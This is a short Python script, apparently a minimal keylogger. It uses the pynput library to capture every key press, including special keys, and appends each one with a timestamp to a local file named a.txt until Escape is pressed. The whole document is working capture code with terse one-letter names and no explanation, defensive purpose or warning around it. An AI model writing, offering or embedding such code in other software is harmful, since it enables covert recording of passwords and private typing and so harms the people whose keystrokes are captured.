#!/usr/bin/env python3

import pynput.keyboard as k, logging as l

l.basicConfig(filename=("a.txt"), level=l.DEBUG, format='%(asctime)s: %(message)s')
def p(e): 
    try: l.info(str(e))
    except: l.info('Special Key {0} pressed'.format(e))
def r(e): 
    if e == k.Key.esc: return False
with k.Listener(on_press=p, on_release=r) as t: t.join()
